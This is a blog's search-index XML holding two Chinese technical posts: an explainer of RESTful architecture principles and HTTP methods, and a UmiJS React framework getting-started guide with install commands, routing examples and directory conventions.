<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>RESTful介绍</title>
    <url>/2019/04/30/RESTful%E6%9E%B6%E6%9E%84%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>本文引用自<a href="https://www.runoob.com/w3cnote/restful-architecture.html" target="_blank" rel="noopener">RESTful 架构详解 | 菜鸟教程</a></p>
<h1 id="1-什么是REST"><a href="#1-什么是REST" class="headerlink" title="1. 什么是REST"></a>1. 什么是REST</h1><p>REST全称是Representational State Transfer，中文意思是表述（编者注：通常译为表征）性状态转移。 它首次出现在2000年Roy Fielding的博士论文中，Roy Fielding是HTTP规范的主要编写者之一。 他在论文中提到：”我这篇文章的写作目的，就是想在符合架构原理的前提下，理解和评估以网络为基础的应用软件的架构设计，得到一个功能强、性能好、适宜通信的架构。REST指的是一组架构约束条件和原则。” 如果一个架构符合REST的约束条件和原则，我们就称它为RESTful架构。</p>
<a id="more"></a>
<p>REST本身并没有创造新的技术、组件或服务，而隐藏在RESTful背后的理念就是使用Web的现有特征和能力， 更好地使用现有Web标准中的一些准则和约束。虽然REST本身受Web技术的影响很深， 但是理论上REST架构风格并不是绑定在HTTP上，只不过目前HTTP是唯一与REST相关的实例。 所以我们这里描述的REST也是通过HTTP实现的REST。</p>
<h1 id="2-理解RESTful"><a href="#2-理解RESTful" class="headerlink" title="2. 理解RESTful"></a>2. 理解RESTful</h1><p>下面我们结合REST原则，围绕资源展开讨论，从资源的定义、获取、表述、关联、状态变迁等角度，列举一些关键概念并加以解释。</p>
<p>. 资源与URI<br>. 统一资源接口<br>. 资源的表述<br>. 资源的链接<br>. 状态的转移</p>
<h2 id="2-1-资源与URI"><a href="#2-1-资源与URI" class="headerlink" title="2.1 资源与URI"></a>2.1 资源与URI</h2><p>REST全称是表述性状态转移，那究竟指的是什么的表述? 其实指的就是资源。任何事物，只要有被引用到的必要，它就是一个资源。资源可以是实体(例如手机号码)，也可以只是一个抽象概念(例如价值) 。下面是一些资源的例子：</p>
<p>. 某用户的手机号码<br>. 某用户的个人信息<br>. 最多用户订购的GPRS套餐<br>. 两个产品之间的依赖关系<br>. 某用户可以办理的优惠套餐<br>. 某手机号码的潜在价值</p>
<p>要让一个资源可以被识别，需要有个唯一标识，在Web中这个唯一标识就是URI(Uniform Resource Identifier)。<br>URI既可以看成是资源的地址，也可以看成是资源的名称。如果某些信息没有使用URI来表示，那它就不能算是一个资源， 只能算是资源的一些信息而已。URI的设计应该遵循可寻址性原则，具有自描述性，需要在形式上给人以直觉上的关联。这里以github网站为例，给出一些还算不错的URI：</p>
<p>. <a href="https://github.com/git" target="_blank" rel="noopener">https://github.com/git</a><br>. <a href="https://github.com/git/git" target="_blank" rel="noopener">https://github.com/git/git</a><br>. <a href="https://github.com/git/git/blob/master/block-sha1/sha1.h" target="_blank" rel="noopener">https://github.com/git/git/blob/master/block-sha1/sha1.h</a><br>. <a href="https://github.com/git/git/commit/e3af72cdafab5993d18fae056f87e1d675913d08" target="_blank" rel="noopener">https://github.com/git/git/commit/e3af72cdafab5993d18fae056f87e1d675913d08</a><br>. <a href="https://github.com/git/git/pulls" target="_blank" rel="noopener">https://github.com/git/git/pulls</a><br>. <a href="https://github.com/git/git/pulls?state=closed" target="_blank" rel="noopener">https://github.com/git/git/pulls?state=closed</a><br>. <a href="https://github.com/git/git/compare/master…next" target="_blank" rel="noopener">https://github.com/git/git/compare/master…next</a></p>
<p>下面让我们来看看URI设计上的一些技巧:</p>
<p>. 使用_或-来让URI可读性更好</p>
<p>但现在越来越多的网站使用_或-来分隔一些单词，让URI看上去更为人性化。 例如国内比较出名的开源中国社区，它上面的新闻地址就采用这种风格， 如<a href="http://www.oschina.net/news/38119/oschina-translate-reward-plan。" target="_blank" rel="noopener">http://www.oschina.net/news/38119/oschina-translate-reward-plan。</a></p>
<p>. 使用/来表示资源的层级关系</p>
<p>例如上述/git/git/commit/e3af72cdafab5993d18fae056f87e1d675913d08就表示了一个多级的资源， 指的是git用户的git项目的某次提交记录，又例如/orders/2012/10可以用来表示2012年10月的订单记录。</p>
<p>. 使用?用来过滤资源</p>
<p>例如/git/git/pulls用来表示git项目的所有推入请求，而/pulls?state=closed用来表示git项目中已经关闭的推入请求， 这种URL通常对应的是一些特定条件的查询结果或算法运算结果。</p>
<p>. ,或;可以用来表示同级资源的关系</p>
<p>有时候我们需要表示同级资源的关系时，可以使用,或;来进行分割。例如哪天github可以比较某个文件在随意两次提交记录之间的差异，或许可以使用/git/git /block-sha1/sha1.h/compare/e3af72cdafab5993d18fae056f87e1d675913d08;bd63e61bdf38e872d5215c07b264dcc16e4febca作为URI。 不过，现在github是使用…来做这个事情的，例如/git/git/compare/master…next。</p>
<h2 id="2-2-统一资源接口"><a href="#2-2-统一资源接口" class="headerlink" title="2.2 统一资源接口"></a>2.2 统一资源接口</h2><p>RESTful架构应该遵循统一接口原则，统一接口包含了一组受限的预定义的操作，不论什么样的资源，都是通过使用相同的接口进行资源的访问。接口应该使用标准的HTTP方法如GET，PUT和POST，并遵循这些方法的语义。</p>
<p>如果按照HTTP方法的语义来暴露资源，那么接口将会拥有安全性和幂等性的特性，例如GET和HEAD请求都是安全的， 无论请求多少次，都不会改变服务器状态。而GET、HEAD、PUT和DELETE请求都是幂等的，无论对资源操作多少次， 结果总是一样的，后面的请求并不会产生比第一次更多的影响。</p>
<p>下面列出了GET，DELETE，PUT和POST的典型用法:</p>
<p>GET</p>
<p>. 安全且幂等<br>. 获取表示<br>. 变更时获取表示（缓存）<br>. 200（OK） - 表示已在响应中发出<br>. 204（无内容） - 资源有空表示<br>. 301（Moved Permanently） - 资源的URI已被更新<br>. 303（See Other） - 其他（如，负载均衡）<br>. 304（not modified）- 资源未更改（缓存）<br>. 400 （bad request）- 指代坏请求（如，参数错误）<br>. 404 （not found）- 资源不存在<br>. 406 （not acceptable）- 服务端不支持所需表示<br>. 500 （internal server error）- 通用错误响应<br>. 503 （Service Unavailable）- 服务端当前无法处理请求</p>
<p>POST</p>
<p>. 不安全且不幂等<br>. 使用服务端管理的（自动产生）的实例号创建资源<br>. 创建子资源<br>. 部分更新资源<br>. 如果没有被修改，则不过更新资源（乐观锁）<br>. 200（OK）- 如果现有资源已被更改<br>. 201（created）- 如果新资源被创建<br>. 202（accepted）- 已接受处理请求但尚未完成（异步处理）<br>. 301（Moved Permanently）- 资源的URI被更新<br>. 303（See Other）- 其他（如，负载均衡）<br>. 400（bad request）- 指代坏请求<br>. 404 （not found）- 资源不存在<br>. 406 （not acceptable）- 服务端不支持所需表示<br>. 409 （conflict）- 通用冲突<br>. 412 （Precondition Failed）- 前置条件失败（如执行条件更新时的冲突）<br>. 415 （unsupported media type）- 接受到的表示不受支持<br>. 500 （internal server error）- 通用错误响应<br>. 503 （Service Unavailable）- 服务当前无法处理请求</p>
<p>PUT</p>
<p>. 不安全但幂等<br>. 用客户端管理的实例号创建一个资源<br>. 通过替换的方式更新资源<br>. 如果未被修改，则更新资源（乐观锁）<br>. 200 （OK）- 如果已存在资源被更改<br>. 201 （created）- 如果新资源被创建<br>. 301（Moved Permanently）- 资源的URI已更改<br>. 303 （See Other）- 其他（如，负载均衡）<br>. 400 （bad request）- 指代坏请求<br>. 404 （not found）- 资源不存在<br>. 406 （not acceptable）- 服务端不支持所需表示<br>. 409 （conflict）- 通用冲突<br>. 412 （Precondition Failed）- 前置条件失败（如执行条件更新时的冲突）<br>. 415 （unsupported media type）- 接受到的表示不受支持<br>. 500 （internal server error）- 通用错误响应<br>. 503 （Service Unavailable）- 服务当前无法处理请求</p>
<p>DELETE</p>
<p>. 不安全但幂等<br>. 删除资源<br>. 200 （OK）- 资源已被删除<br>. 301 （Moved Permanently）- 资源的URI已更改<br>. 303 （See Other）- 其他，如负载均衡<br>. 400 （bad request）- 指代坏请求<br>. 404 （not found）- 资源不存在<br>. 409 （conflict）- 通用冲突<br>. 500 （internal server error）- 通用错误响应<br>. 503 （Service Unavailable）- 服务端当前无法处理请求</p>
<p>下面我们来看一些实践中常见的问题:</p>
<p>POST和PUT用于创建资源时有什么区别?</p>
<p>POST和PUT在创建资源的区别在于，所创建的资源的名称(URI)是否由客户端决定。 例如为我的博文增加一个java的分类，生成的路径就是分类名/categories/java，那么就可以采用PUT方法。不过很多人直接把POST、GET、PUT、DELETE直接对应上CRUD，例如在一个典型的rails实现的RESTful应用中就是这么做的。</p>
<p>我认为，这是因为rails默认使用服务端生成的ID作为URI的缘故，而不少人就是通过rails实践REST的，所以很容易造成这种误解。</p>
<p>客户端不一定都支持这些HTTP方法吧?</p>
<p>的确有这种情况，特别是一些比较古老的基于浏览器的客户端，只能支持GET和POST两种方法。</p>
<p>在实践上，客户端和服务端都可能需要做一些妥协。例如rails框架就支持通过隐藏参数_method=DELETE来传递真实的请求方法， 而像Backbone这样的客户端MVC框架则允许传递_method传输和设置X-HTTP-Method-Override头来规避这个问题。</p>
<p>统一接口是否意味着不能扩展带特殊语义的方法?</p>
<p>统一接口并不阻止你扩展方法，只要方法对资源的操作有着具体的、可识别的语义即可，并能够保持整个接口的统一性。</p>
<p>像WebDAV就对HTTP方法进行了扩展，增加了LOCK、UPLOCK等方法。而github的API则支持使用PATCH方法来进行issue的更新，例如:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PATCH /repos/:owner/:repo/issues/:number</span><br></pre></td></tr></table></figure></p>
<p>不过，需要注意的是，像PATCH这种不是HTTP标准方法的，服务端需要考虑客户端是否能够支持的问题。</p>
<p>统一资源接口对URI有什么指导意义?</p>
<p>统一资源接口要求使用标准的HTTP方法对资源进行操作，所以URI只应该来表示资源的名称，而不应该包括资源的操作。</p>
<p>通俗来说，URI不应该使用动作来描述。例如，下面是一些不符合统一接口要求的URI:</p>
<p>. GET /getUser/1<br>. POST /createUser<br>. PUT /updateUser/1<br>. DELETE /deleteUser/1</p>
<p>如果GET请求增加计数器，这是否违反安全性?</p>
<p>安全性不代表请求不产生副作用，例如像很多API开发平台，都对请求流量做限制。像github，就会限制没有认证的请求每小时只能请求60次。</p>
<p>但客户端不是为了追求副作用而发出这些GET或HEAD请求的，产生副作用是服务端”自作主张”的。</p>
<p>另外，服务端在设计时，也不应该让副作用太大，因为客户端认为这些请求是不会产生副作用的。</p>
<p>直接忽视缓存可取吗?</p>
<p>即使你按各个动词的原本意图来使用它们，你仍可以轻易禁止缓存机制。 最简单的做法就是在你的HTTP响应里增加这样一个报头： Cache-control: no-cache。 但是，同时你也对失去了高效的缓存与再验证的支持(使用Etag等机制)。</p>
<p>对于客户端来说，在为一个REST式服务实现程序客户端时，也应该充分利用现有的缓存机制，以免每次都重新获取表示。</p>
<p>响应代码的处理有必要吗?</p>
<p>HTTP的响应代码可用于应付不同场合，正确使用这些状态代码意味着客户端与服务器可以在一个具备较丰富语义的层次上进行沟通。</p>
<p>例如，201（”Created”）响应代码表明已经创建了一个新的资源，其URI在Location响应报头里。</p>
<p>假如你不利用HTTP状态代码丰富的应用语义，那么你将错失提高重用性、增强互操作性和提升松耦合性的机会。</p>
<p>如果这些所谓的RESTful应用必须通过响应实体才能给出错误信息，那么SOAP就是这样的了，它就能够满足了。</p>
<h2 id="2-3-资源的表述"><a href="#2-3-资源的表述" class="headerlink" title="2.3 资源的表述"></a>2.3 资源的表述</h2><p>上面提到，客户端通过HTTP方法可以获取资源，是吧? 不，确切的说，客户端获取的只是资源的表述而已。 资源在外界的具体呈现，可以有多种表述(或成为表现、表示)形式，在客户端和服务端之间传送的也是资源的表述，而不是资源本身。 例如文本资源可以采用html、xml、json等格式，图片可以使用PNG或JPG展现出来。</p>
<p>资源的表述包括数据和描述数据的元数据，例如，HTTP头”Content-Type” 就是这样一个元数据属性。</p>
<p>那么客户端如何知道服务端提供哪种表述形式呢?</p>
<p>答案是可以通过HTTP内容协商，客户端可以通过Accept头请求一种特定格式的表述，服务端则通过Content-Type告诉客户端资源的表述形式。</p>
<p>以github为例，请求某组织资源的json格式的表述形式:<br><img src="https://mfaying.github.io/images/restful/1.jpg" alt="avatar"><br>假如github也能够支持xml格式的表述格式，那么结果就是这样的:<br><img src="https://mfaying.github.io/images/restful/2.jpg" alt="avatar"><br>下面我们来看一些实践上常见的设计:在URI里边带上版本号,有些API在URI里边带上版本号，例如:</p>
<p>. <a href="http://api.example.com/1.0/foo" target="_blank" rel="noopener">http://api.example.com/1.0/foo</a><br>. <a href="http://api.example.com/1.2/foo" target="_blank" rel="noopener">http://api.example.com/1.2/foo</a><br>. <a href="http://api.example.com/2.0/foo" target="_blank" rel="noopener">http://api.example.com/2.0/foo</a></p>
<p>如果我们把版本号理解成资源的不同表述形式的话，就应该只是用一个URL，并通过Accept头部来区分，还是以github为例，它的Accept的完整格式是:application/vnd.github[.version].param[+json]</p>
<p>对于v3版本的话，就是Accept: application/vnd.github.v3。对于上面的例子，同理可以使用使用下面的头部:</p>
<p>. Accept: vnd.example-com.foo+json; version=1.0<br>. Accept: vnd.example-com.foo+json; version=1.2<br>. Accept: vnd.example-com.foo+json; version=2.0</p>
<p>使用URI后缀来区分表述格式</p>
<p>像rails框架，就支持使用/users.xml或/users.json来区分不同的格式。 这样的方式对于客户端来说，无疑是更为直观，但混淆了资源的名称和资源的表述形式。 我个人认为，还是应该优先使用内容协商来区分表述格式。</p>
<p>如何处理不支持的表述格式</p>
<p>当服务器不支持所请求的表述格式，那么应该怎么办？若服务器不支持，它应该返回一个HTTP 406响应，表示拒绝处理该请求。下面以github为例，展示了一个请求XML表述资源的结果：<br><img src="https://mfaying.github.io/images/restful/3.jpg" alt="avatar"></p>
<h2 id="2-4-资源的链接"><a href="#2-4-资源的链接" class="headerlink" title="2.4 资源的链接"></a>2.4 资源的链接</h2><p>我们知道REST是使用标准的HTTP方法来操作资源的，但仅仅因此就理解成带CURD的Web数据库架构就太过于简单了。</p>
<p>这种反模式忽略了一个核心概念：”超媒体即应用状态引擎（hypermedia as the engine of application state）”。 超媒体是什么?</p>
<p>当你浏览Web网页时，从一个连接跳到一个页面，再从另一个连接跳到另外一个页面，就是利用了超媒体的概念：把一个个把资源链接起来.</p>
<p>要达到这个目的，就要求在表述格式里边加入链接来引导客户端。在《RESTful Web Services》一书中，作者把这种具有链接的特性成为连通性。下面我们具体来看一些例子。</p>
<p>下面展示的是github获取某个组织下的项目列表的请求，可以看到在响应头里边增加Link头告诉客户端怎么访问下一页和最后一页的记录。 而在响应体里边，用url来链接项目所有者和项目地址。<br><img src="https://mfaying.github.io/images/restful/4.jpg" alt="avatar"><br>又例如下面这个例子，创建订单后通过链接引导客户端如何去付款。<br><img src="https://mfaying.github.io/images/restful/5.jpg" alt="avatar"><br>上面的例子展示了如何使用超媒体来增强资源的连通性。很多人在设计RESTful架构时，使用很多时间来寻找漂亮的URI，而忽略了超媒体。所以，应该多花一些时间来给资源的表述提供链接，而不是专注于”资源的CRUD”。</p>
<h2 id="2-5-状态的转移"><a href="#2-5-状态的转移" class="headerlink" title="2.5 状态的转移"></a>2.5 状态的转移</h2><p>有了上面的铺垫，再讨论REST里边的状态转移就会很容易理解了。</p>
<p>不过，我们先来讨论一下REST原则中的无状态通信原则。初看一下，好像自相矛盾了，既然无状态，何来状态转移一说?其实，这里说的无状态通信原则，并不是说客户端应用不能有状态，而是指服务端不应该保存客户端状态。</p>
<h3 id="2-5-1-应用状态与资源状态"><a href="#2-5-1-应用状态与资源状态" class="headerlink" title="2.5.1 应用状态与资源状态"></a>2.5.1 应用状态与资源状态</h3><p>实际上，状态应该区分应用状态和资源状态，客户端负责维护应用状态，而服务端维护资源状态。</p>
<p>客户端与服务端的交互必须是无状态的，并在每一次请求中包含处理该请求所需的一切信息。</p>
<p>服务端不需要在请求间保留应用状态，只有在接受到实际请求的时候，服务端才会关注应用状态。</p>
<p>这种无状态通信原则，使得服务端和中介能够理解独立的请求和响应。</p>
<p>在多次请求中，同一客户端也不再需要依赖于同一服务器，方便实现高可扩展和高可用性的服务端。</p>
<p>但有时候我们会做出违反无状态通信原则的设计，例如利用Cookie跟踪某个服务端会话状态，常见的像J2EE里边的JSESSIONID。</p>
<p>这意味着，浏览器随各次请求发出去的Cookie是被用于构建会话状态的。</p>
<p>当然，如果Cookie保存的是一些服务器不依赖于会话状态即可验证的信息（比如认证令牌），这样的Cookie也是符合REST原则的。</p>
<h3 id="2-5-2-应用状态的转移"><a href="#2-5-2-应用状态的转移" class="headerlink" title="2.5.2 应用状态的转移"></a>2.5.2 应用状态的转移</h3><p>状态转移到这里已经很好理解了， “会话”状态不是作为资源状态保存在服务端的，而是被客户端作为应用状态进行跟踪的。客户端应用状态在服务端提供的超媒体的指引下发生变迁。服务端通过超媒体告诉客户端当前状态有哪些后续状态可以进入。</p>
<p>这些类似”下一页”之类的链接起的就是这种推进状态的作用——指引你如何从当前状态进入下一个可能的状态。</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title>UmiJS应用框架整理</title>
    <url>/2019/04/30/UmiJS%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>整理自<a href="https://umijs.org/zh/guide/" target="_blank" rel="noopener">umi官方文档</a></p>
<p>umi，中文可发音为乌米，是一个可插拔的企业级 react 应用框架。umi 以路由为基础的，支持类 next.js 的约定式路由，以及各种进阶的路由功能，并以此进行功能扩展，比如支持路由级的按需加载。然后配以完善的插件体系，覆盖从源码到构建产物的每个生命周期，支持各种功能扩展和业务需求，目前内外部加起来已有 50+ 的插件。</p>
<p>umi 是蚂蚁金服的底层前端框架，已直接或间接地服务了 600+ 应用，包括 java、node、H5 无线、离线（Hybrid）应用、纯前端 assets 应用、CMS 应用等。</p>
<a id="more"></a>
<h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>环境准备</p>
<p>首先得有 node，并确保 node 版本是 8.10 或以上。（mac下推荐使用 nvm 来管理 node 版本）<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> node -v</span><br><span class="line">8.1x</span><br></pre></td></tr></table></figure></p>
<p>推荐使用 yarn 管理 npm 依赖，并使用国内源（阿里用户使用内网源）。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span> 国内源</span><br><span class="line"><span class="meta">$</span> npm i yarn tyarn -g</span><br><span class="line"><span class="meta">#</span> 后面文档里的 yarn 换成 tyarn</span><br><span class="line"><span class="meta">$</span> tyarn -v</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 阿里内网源</span><br><span class="line"><span class="meta">$</span> tnpm i yarn @ali/yarn -g</span><br><span class="line"><span class="meta">#</span> 后面文档里的 yarn 换成 ayarn</span><br><span class="line"><span class="meta">$</span> ayarn -v</span><br></pre></td></tr></table></figure></p>
<p>然后全局安装 umi，并确保版本是 2.0.0 或以上。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> yarn global add umi</span><br><span class="line"><span class="meta">$</span> umi -v</span><br><span class="line">2.0.0</span><br></pre></td></tr></table></figure></p>
<p>脚手架</p>
<p>先找个地方建个空目录。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir myapp &amp;&amp; cd myapp</span><br></pre></td></tr></table></figure></p>
<p>然后通过 umi g 创建一些页面，<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> umi g page index</span><br><span class="line"><span class="meta">$</span> umi g page users</span><br></pre></td></tr></table></figure></p>
<p>umi g 是 umi generate 的别名，可用于快速生成 component、page、layout 等，并且可在插件里被扩展，比如 umi-plugin-dva 里扩展了 dva:model，然后就可以通过 umi g dva:model foo 快速 dva 的 model。</p>
<p>这里的 pages 目录是页面所在的目录，umi 里约定默认情况下 pages 下所有的 js 文件即路由。</p>
<p>然后启动本地服务器，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> umi dev</span><br></pre></td></tr></table></figure>
<p>约定式路由</p>
<p>然后我们在 index 和 users 直接加一些路由跳转逻辑。</p>
<p>先修改 pages/index.js，<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">+ <span class="keyword">import</span> Link <span class="keyword">from</span> <span class="string">'umi/link'</span>;</span><br><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">'./index.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=&#123;styles.normal&#125;&gt;</span><br><span class="line">      &lt;h1&gt;Page index&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">+     &lt;Link to="/u</span>sers<span class="string">"&gt;go to /users&lt;/Link&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  );</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>再修改 pages/users.js，<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">+ <span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'umi/router'</span>;</span><br><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">'./index.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=&#123;styles.normal&#125;&gt;</span><br><span class="line">      &lt;h1&gt;Page index&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">+     &lt;button onClick=&#123;() =&gt; &#123; router.goBack(); &#125;&#125;&gt;go back&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>后浏览器验证，应该已经可以在 index 和 users 两个页面之间通过路由跳转了。</p>
<p>构建</p>
<p>执行 umi build，构建产物默认生成到 ./dist 下</p>
<p>本地验证</p>
<p>发布之前，可以通过 serve 做本地验证，<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> yarn global add serve</span><br><span class="line"><span class="meta">$</span> serve ./dist</span><br><span class="line"></span><br><span class="line">Serving!</span><br><span class="line"></span><br><span class="line">- Local:            http://localhost:5000</span><br><span class="line">- On Your Network:  http://&#123;Your IP&#125;:5000</span><br><span class="line"></span><br><span class="line">Copied local address to clipboard!</span><br></pre></td></tr></table></figure></p>
<p>访问 <a href="http://localhost:5000，正常情况下应该是和" target="_blank" rel="noopener">http://localhost:5000，正常情况下应该是和</a> umi dev 一致的。</p>
<h1 id="通过脚手架创建项目"><a href="#通过脚手架创建项目" class="headerlink" title="通过脚手架创建项目"></a>通过脚手架创建项目</h1><h2 id="介绍-create-umi"><a href="#介绍-create-umi" class="headerlink" title="介绍 create-umi"></a>介绍 create-umi</h2><p>umi 通过 create-umi 提供脚手架能力，包含：<br>.project，通用项目脚手架，支持选择是否启用 TypeScript，以及 .umi-plugin-react 包含的功能<br>.ant-design-pro，仅包含 ant-design-pro 布局的脚手架，具体页面可通.过 umi block 添加<br>.block，区块脚手架<br>.plugin，插件脚手架<br>.library，依赖（组件）库脚手架，基于 umi-plugin-library</p>
<h2 id="创建-umi-项目"><a href="#创建-umi-项目" class="headerlink" title="创建 umi 项目"></a>创建 umi 项目</h2><p>你可以通过 yarn create umi 或 npm create umi 使用 create-umi。推荐使用 yarn create 命令，能确保每次使用最新的脚手架。</p>
<p>首先，在新目录下使用 yarn create umi，<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> mkdir myapp &amp;&amp; cd myapp</span><br><span class="line"><span class="meta">$</span> yarn create umi</span><br></pre></td></tr></table></figure></p>
<p>选择 project，<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">? Select the boilerplate type (Use arrow keys)</span><br><span class="line">  ant-design-pro  - Create project with an layout-only ant-design-pro boilerplate, use together with umi block.</span><br><span class="line">❯ app             - Create project with a simple boilerplate, support typescript.</span><br><span class="line">  block           - Create a umi block.</span><br><span class="line">  library         - Create a library with umi.</span><br><span class="line">  plugin          - Create a umi plugin.</span><br></pre></td></tr></table></figure></p>
<p>选择是否使用 TypeScript，<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">? Do you want to use typescript? (y/N)</span><br></pre></td></tr></table></figure></p>
<p>然后，选择你需要的功能，功能介绍详见 plugin/umi-plugin-react，<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">? What functionality do you want to enable? (Press &lt;space&gt; to select, &lt;a&gt; to toggle all, &lt;i&gt; to invert selection)</span><br><span class="line">❯◯ antd</span><br><span class="line"> ◯ dva</span><br><span class="line"> ◯ code splitting</span><br><span class="line"> ◯ dll</span><br></pre></td></tr></table></figure></p>
<p>确定后，会根据你的选择自动创建好目录和文件，然后安装依赖，<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> yarn</span><br></pre></td></tr></table></figure></p>
<p>最后通过 yarn start 启动本地开发，<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> yarn start</span><br></pre></td></tr></table></figure></p>
<p>如果顺利，在浏览器打开 <a href="http://localhost:8000" target="_blank" rel="noopener">http://localhost:8000</a> 可看到界面</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><a href="https://umijs.org/zh/guide/examples.html" target="_blank" rel="noopener">https://umijs.org/zh/guide/examples.html</a></p>
<h1 id="目录及约定"><a href="#目录及约定" class="headerlink" title="目录及约定"></a>目录及约定</h1><p>在文件和目录的组织上，umi 更倾向于选择约定的方式。</p>
<p>一个复杂应用的目录结构如下：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── dist/                          // 默认的 build 输出目录</span><br><span class="line">├── mock/                          // mock 文件所在目录，基于 express</span><br><span class="line">├── config/</span><br><span class="line">    ├── config.js                  // umi 配置，同 .umirc.js，二选一</span><br><span class="line">└── src/                           // 源码目录，可选</span><br><span class="line">    ├── layouts/index.js           // 全局布局</span><br><span class="line">    ├── pages/                     // 页面目录，里面的文件即路由</span><br><span class="line">        ├── .umi/                  // dev 临时目录，需添加到 .gitignore</span><br><span class="line">        ├── .umi-production/       // build 临时目录，会自动删除</span><br><span class="line">        ├── document.ejs           // HTML 模板</span><br><span class="line">        ├── 404.js                 // 404 页面</span><br><span class="line">        ├── page1.js               // 页面 1，任意命名，导出 react 组件</span><br><span class="line">        ├── page1.test.js          // 用例文件，umi test 会匹配所有 .test.js 和 .e2e.js 结尾的文件</span><br><span class="line">        └── page2.js               // 页面 2，任意命名</span><br><span class="line">    ├── global.css                 // 约定的全局样式文件，自动引入，也可以用 global.less</span><br><span class="line">    ├── global.js                  // 可以在这里加入 polyfill</span><br><span class="line">    ├── app.js                     // 运行时配置文件</span><br><span class="line">├── .umirc.js                      // umi 配置，同 config/config.js，二选一</span><br><span class="line">├── .env                           // 环境变量</span><br><span class="line">└── package.json</span><br></pre></td></tr></table></figure></p>
<h2 id="ES6-语法"><a href="#ES6-语法" class="headerlink" title="ES6 语法"></a>ES6 语法</h2><p>配置文件、mock 文件等都有通过 @babel/register 注册实时编译，所以可以和 src 里的文件一样，使用 ES6 的语法和 es modules 。</p>
<h2 id="dist"><a href="#dist" class="headerlink" title="dist"></a>dist</h2><p>默认输出路径，可通过配置 outputPath 修改。</p>
<h2 id="mock"><a href="#mock" class="headerlink" title="mock"></a>mock</h2><p>此目录下所有的 .js 文件（包括 _ 前缀的）都会被解析为 mock 文件。比如，新建 mock/users.js，内容如下：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">  '/api/users': ['a', 'b'],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后在浏览器里访问 <a href="http://localhost:8000/api/users" target="_blank" rel="noopener">http://localhost:8000/api/users</a> 就可以看到 [‘a’, ‘b’] 了。如果想忽略 mock 文件夹下的部分文件，参考 mock.exclude 配置。</p>
<h2 id="src"><a href="#src" class="headerlink" title="src"></a>src</h2><p>约定 src 为源码目录，如果不存在 src 目录，则当前目录会被作为源码目录。比如：下面两种目录结构的效果是一致的。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+ src</span><br><span class="line">  + pages</span><br><span class="line">    - index.js</span><br><span class="line">  + layouts</span><br><span class="line">    - index.js</span><br><span class="line">- .umirc.js</span><br></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+ pages</span><br><span class="line">  - index.js</span><br><span class="line">+ layouts</span><br><span class="line">  - index.js</span><br><span class="line">- .umirc.js</span><br></pre></td></tr></table></figure>
<h2 id="src-layouts-index-js"><a href="#src-layouts-index-js" class="headerlink" title="src/layouts/index.js"></a>src/layouts/index.js</h2><p>注：配置式路由下无效。<br>全局布局，在路由外面套的一层路由。比如，你的路由是：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/'</span>, <span class="attr">component</span>: <span class="string">'./pages/index'</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">'/users'</span>, <span class="attr">component</span>: <span class="string">'./pages/users'</span> &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
